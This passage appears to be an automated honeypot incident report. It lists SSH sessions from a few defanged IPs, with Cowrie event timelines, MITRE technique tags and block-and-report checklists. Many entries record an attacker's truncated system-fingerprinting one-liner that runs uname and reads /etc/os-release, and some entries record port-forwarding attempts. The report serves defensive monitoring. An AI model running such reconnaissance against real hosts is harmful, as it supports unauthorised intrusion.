- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f446dfc7beb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:20 |
| **Last Seen** | 2026-07-11 08:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:20:35` | `cowrie.session.connect` |
| `2026-07-11 08:20:35` | `cowrie.client.version` |
| `2026-07-11 08:20:35` | `cowrie.client.kex` |
| `2026-07-11 08:20:37` | `cowrie.login.success` |
| `2026-07-11 08:20:39` | `cowrie.session.params` |
| `2026-07-11 08:20:39` | `cowrie.command.input` |
| `2026-07-11 08:20:39` | `cowrie.command.input` |
| `2026-07-11 08:20:39` | `cowrie.command.input` |
| `2026-07-11 08:20:39` | `cowrie.command.input` |
| `2026-07-11 08:20:39` | `cowrie.command.input` |
| `2026-07-11 08:20:39` | `cowrie.command.success` |
| `2026-07-11 08:20:39` | `cowrie.command.input` |
| `2026-07-11 08:20:39` | `cowrie.command.input` |
| `2026-07-11 08:20:39` | `cowrie.command.input` |
| `2026-07-11 08:20:39` | `cowrie.command.input` |
| `2026-07-11 08:20:39` | `cowrie.log.closed` |
| `2026-07-11 08:20:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b700fc34670c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 08:20 |
| **Last Seen** | 2026-07-11 08:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:20:54` | `cowrie.session.connect` |
| `2026-07-11 08:20:54` | `cowrie.client.version` |
| `2026-07-11 08:20:54` | `cowrie.client.kex` |
| `2026-07-11 08:20:56` | `cowrie.login.success` |
| `2026-07-11 08:20:57` | `cowrie.session.params` |
| `2026-07-11 08:20:57` | `cowrie.command.input` |
| `2026-07-11 08:20:57` | `cowrie.log.closed` |
| `2026-07-11 08:20:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f840e84d7bc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:22 |
| **Last Seen** | 2026-07-11 08:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:22:14` | `cowrie.session.connect` |
| `2026-07-11 08:22:14` | `cowrie.client.version` |
| `2026-07-11 08:22:14` | `cowrie.client.kex` |
| `2026-07-11 08:22:16` | `cowrie.login.success` |
| `2026-07-11 08:22:18` | `cowrie.session.params` |
| `2026-07-11 08:22:18` | `cowrie.command.input` |
| `2026-07-11 08:22:18` | `cowrie.command.input` |
| `2026-07-11 08:22:18` | `cowrie.command.input` |
| `2026-07-11 08:22:18` | `cowrie.command.input` |
| `2026-07-11 08:22:18` | `cowrie.command.input` |
| `2026-07-11 08:22:18` | `cowrie.command.success` |
| `2026-07-11 08:22:18` | `cowrie.command.input` |
| `2026-07-11 08:22:18` | `cowrie.command.input` |
| `2026-07-11 08:22:18` | `cowrie.command.input` |
| `2026-07-11 08:22:18` | `cowrie.command.input` |
| `2026-07-11 08:22:18` | `cowrie.log.closed` |
| `2026-07-11 08:22:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32e9f1d70901

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:23 |
| **Last Seen** | 2026-07-11 08:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:23:58` | `cowrie.session.connect` |
| `2026-07-11 08:23:58` | `cowrie.client.version` |
| `2026-07-11 08:23:58` | `cowrie.client.kex` |
| `2026-07-11 08:23:59` | `cowrie.login.success` |
| `2026-07-11 08:24:01` | `cowrie.session.params` |
| `2026-07-11 08:24:01` | `cowrie.command.input` |
| `2026-07-11 08:24:01` | `cowrie.command.input` |
| `2026-07-11 08:24:01` | `cowrie.command.input` |
| `2026-07-11 08:24:01` | `cowrie.command.input` |
| `2026-07-11 08:24:01` | `cowrie.command.input` |
| `2026-07-11 08:24:01` | `cowrie.command.success` |
| `2026-07-11 08:24:01` | `cowrie.command.input` |
| `2026-07-11 08:24:01` | `cowrie.command.input` |
| `2026-07-11 08:24:01` | `cowrie.command.input` |
| `2026-07-11 08:24:01` | `cowrie.command.input` |
| `2026-07-11 08:24:01` | `cowrie.log.closed` |
| `2026-07-11 08:24:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e8c26bac003

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:25 |
| **Last Seen** | 2026-07-11 08:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:25:34` | `cowrie.session.connect` |
| `2026-07-11 08:25:34` | `cowrie.client.version` |
| `2026-07-11 08:25:34` | `cowrie.client.kex` |
| `2026-07-11 08:25:36` | `cowrie.login.success` |
| `2026-07-11 08:25:37` | `cowrie.session.params` |
| `2026-07-11 08:25:37` | `cowrie.command.input` |
| `2026-07-11 08:25:37` | `cowrie.command.input` |
| `2026-07-11 08:25:37` | `cowrie.command.input` |
| `2026-07-11 08:25:37` | `cowrie.command.input` |
| `2026-07-11 08:25:37` | `cowrie.command.input` |
| `2026-07-11 08:25:37` | `cowrie.command.success` |
| `2026-07-11 08:25:37` | `cowrie.command.input` |
| `2026-07-11 08:25:37` | `cowrie.command.input` |
| `2026-07-11 08:25:37` | `cowrie.command.input` |
| `2026-07-11 08:25:37` | `cowrie.command.input` |
| `2026-07-11 08:25:38` | `cowrie.log.closed` |
| `2026-07-11 08:25:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3441744c3a0d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-11 08:25 |
| **Last Seen** | 2026-07-11 08:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:25:41` | `cowrie.session.connect` |
| `2026-07-11 08:25:41` | `cowrie.client.version` |
| `2026-07-11 08:25:41` | `cowrie.client.kex` |
| `2026-07-11 08:25:42` | `cowrie.login.success` |
| `2026-07-11 08:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bfffda0a813

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-11 08:25 |
| **Last Seen** | 2026-07-11 08:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:25:41` | `cowrie.session.connect` |
| `2026-07-11 08:25:41` | `cowrie.client.version` |
| `2026-07-11 08:25:41` | `cowrie.client.kex` |
| `2026-07-11 08:25:42` | `cowrie.login.success` |
| `2026-07-11 08:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc957de57ada

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-11 08:25 |
| **Last Seen** | 2026-07-11 08:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:25:51` | `cowrie.session.connect` |
| `2026-07-11 08:25:51` | `cowrie.client.version` |
| `2026-07-11 08:25:52` | `cowrie.client.kex` |
| `2026-07-11 08:25:52` | `cowrie.login.success` |
| `2026-07-11 08:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c62478f5f2f5

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-11 08:25 |
| **Last Seen** | 2026-07-11 08:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:25:52` | `cowrie.session.connect` |
| `2026-07-11 08:25:52` | `cowrie.client.version` |
| `2026-07-11 08:25:53` | `cowrie.client.kex` |
| `2026-07-11 08:25:53` | `cowrie.login.success` |
| `2026-07-11 08:25:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be48fbc07379

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:27 |
| **Last Seen** | 2026-07-11 08:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:27:10` | `cowrie.session.connect` |
| `2026-07-11 08:27:10` | `cowrie.client.version` |
| `2026-07-11 08:27:10` | `cowrie.client.kex` |
| `2026-07-11 08:27:12` | `cowrie.login.success` |
| `2026-07-11 08:27:14` | `cowrie.session.params` |
| `2026-07-11 08:27:14` | `cowrie.command.input` |
| `2026-07-11 08:27:14` | `cowrie.command.input` |
| `2026-07-11 08:27:14` | `cowrie.command.input` |
| `2026-07-11 08:27:14` | `cowrie.command.input` |
| `2026-07-11 08:27:14` | `cowrie.command.input` |
| `2026-07-11 08:27:14` | `cowrie.command.success` |
| `2026-07-11 08:27:14` | `cowrie.command.input` |
| `2026-07-11 08:27:14` | `cowrie.command.input` |
| `2026-07-11 08:27:14` | `cowrie.command.input` |
| `2026-07-11 08:27:14` | `cowrie.command.input` |
| `2026-07-11 08:27:14` | `cowrie.log.closed` |
| `2026-07-11 08:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-836499e9fb01

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:28 |
| **Last Seen** | 2026-07-11 08:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:28:39` | `cowrie.session.connect` |
| `2026-07-11 08:28:40` | `cowrie.client.version` |
| `2026-07-11 08:28:40` | `cowrie.client.kex` |
| `2026-07-11 08:28:41` | `cowrie.login.success` |
| `2026-07-11 08:28:42` | `cowrie.session.params` |
| `2026-07-11 08:28:42` | `cowrie.command.input` |
| `2026-07-11 08:28:42` | `cowrie.command.input` |
| `2026-07-11 08:28:42` | `cowrie.command.input` |
| `2026-07-11 08:28:42` | `cowrie.command.input` |
| `2026-07-11 08:28:42` | `cowrie.command.input` |
| `2026-07-11 08:28:42` | `cowrie.command.success` |
| `2026-07-11 08:28:42` | `cowrie.command.input` |
| `2026-07-11 08:28:42` | `cowrie.command.input` |
| `2026-07-11 08:28:42` | `cowrie.command.input` |
| `2026-07-11 08:28:42` | `cowrie.command.input` |
| `2026-07-11 08:28:43` | `cowrie.log.closed` |
| `2026-07-11 08:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2277e28de636

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]10` |
| **First Seen** | 2026-07-11 08:29 |
| **Last Seen** | 2026-07-11 08:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:29:19` | `cowrie.session.connect` |
| `2026-07-11 08:29:20` | `cowrie.client.version` |
| `2026-07-11 08:29:20` | `cowrie.client.kex` |
| `2026-07-11 08:29:22` | `cowrie.login.success` |
| `2026-07-11 08:29:23` | `cowrie.direct-tcpip.request` |
| `2026-07-11 08:29:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]10` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c690c3c0b492

| Field | Detail |
|---|---|
| **Source IP** | `222.236.155[.]146` |
| **First Seen** | 2026-07-11 08:29 |
| **Last Seen** | 2026-07-11 08:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:29:29` | `cowrie.session.connect` |
| `2026-07-11 08:29:30` | `cowrie.client.version` |
| `2026-07-11 08:29:30` | `cowrie.client.kex` |
| `2026-07-11 08:29:32` | `cowrie.login.success` |
| `2026-07-11 08:29:34` | `cowrie.direct-tcpip.request` |
| `2026-07-11 08:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.236.155[.]146` to AbuseIPDB if not already reported
- [ ] Block `222.236.155[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c02e9bfd66c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:30 |
| **Last Seen** | 2026-07-11 08:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:30:00` | `cowrie.session.connect` |
| `2026-07-11 08:30:00` | `cowrie.client.version` |
| `2026-07-11 08:30:00` | `cowrie.client.kex` |
| `2026-07-11 08:30:01` | `cowrie.login.success` |
| `2026-07-11 08:30:02` | `cowrie.session.params` |
| `2026-07-11 08:30:02` | `cowrie.command.input` |
| `2026-07-11 08:30:02` | `cowrie.command.input` |
| `2026-07-11 08:30:02` | `cowrie.command.input` |
| `2026-07-11 08:30:02` | `cowrie.command.input` |
| `2026-07-11 08:30:02` | `cowrie.command.input` |
| `2026-07-11 08:30:02` | `cowrie.command.success` |
| `2026-07-11 08:30:02` | `cowrie.command.input` |
| `2026-07-11 08:30:02` | `cowrie.command.input` |
| `2026-07-11 08:30:02` | `cowrie.command.input` |
| `2026-07-11 08:30:02` | `cowrie.command.input` |
| `2026-07-11 08:30:03` | `cowrie.log.closed` |
| `2026-07-11 08:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7914df7631ec

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:31 |
| **Last Seen** | 2026-07-11 08:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:31:22` | `cowrie.session.connect` |
| `2026-07-11 08:31:23` | `cowrie.client.version` |
| `2026-07-11 08:31:23` | `cowrie.client.kex` |
| `2026-07-11 08:31:24` | `cowrie.login.success` |
| `2026-07-11 08:31:25` | `cowrie.session.params` |
| `2026-07-11 08:31:25` | `cowrie.command.input` |
| `2026-07-11 08:31:25` | `cowrie.command.input` |
| `2026-07-11 08:31:25` | `cowrie.command.input` |
| `2026-07-11 08:31:25` | `cowrie.command.input` |
| `2026-07-11 08:31:25` | `cowrie.command.input` |
| `2026-07-11 08:31:25` | `cowrie.command.success` |
| `2026-07-11 08:31:25` | `cowrie.command.input` |
| `2026-07-11 08:31:25` | `cowrie.command.input` |
| `2026-07-11 08:31:25` | `cowrie.command.input` |
| `2026-07-11 08:31:25` | `cowrie.command.input` |
| `2026-07-11 08:31:25` | `cowrie.log.closed` |
| `2026-07-11 08:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8efa632fcb92

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:32 |
| **Last Seen** | 2026-07-11 08:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:32:47` | `cowrie.session.connect` |
| `2026-07-11 08:32:47` | `cowrie.client.version` |
| `2026-07-11 08:32:47` | `cowrie.client.kex` |
| `2026-07-11 08:32:49` | `cowrie.login.success` |
| `2026-07-11 08:32:50` | `cowrie.session.params` |
| `2026-07-11 08:32:50` | `cowrie.command.input` |
| `2026-07-11 08:32:50` | `cowrie.command.input` |
| `2026-07-11 08:32:50` | `cowrie.command.input` |
| `2026-07-11 08:32:50` | `cowrie.command.input` |
| `2026-07-11 08:32:50` | `cowrie.command.input` |
| `2026-07-11 08:32:50` | `cowrie.command.success` |
| `2026-07-11 08:32:50` | `cowrie.command.input` |
| `2026-07-11 08:32:50` | `cowrie.command.input` |
| `2026-07-11 08:32:50` | `cowrie.command.input` |
| `2026-07-11 08:32:50` | `cowrie.command.input` |
| `2026-07-11 08:32:50` | `cowrie.log.closed` |
| `2026-07-11 08:32:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-604c06d35419

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:34 |
| **Last Seen** | 2026-07-11 08:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
